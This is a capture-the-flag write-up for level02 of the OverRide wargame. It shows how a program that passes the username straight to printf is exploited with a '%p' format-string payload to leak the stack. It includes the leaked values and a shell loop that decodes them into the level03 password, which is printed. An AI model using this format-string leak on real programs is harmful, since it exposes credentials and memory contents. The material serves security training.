# level02

The program reads a username and a password from stdin, then it compares the password to the real password read from `/home/users/level03/.pass`. If two password don't match, the binary will print username by calling `printf(username)` directly with our input username as format string.

## Step 1 Find real password in stack
```
level02@OverRide:~$ perl -e 'print "%p "x30 . "\n"' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4f0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```
We can use the uncontrolled format string to show us the values of stack which contains the password data. `0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d` is the password in little-endian format.

## Step 2 Convert little-endian password to normal string
```
level02@OverRide:~$ pass="0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d"
level02@OverRide:~$ for fragment in $pass
> do
> echo $fragment | xxd -r | rev | tr -d "\n"
> done; echo
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
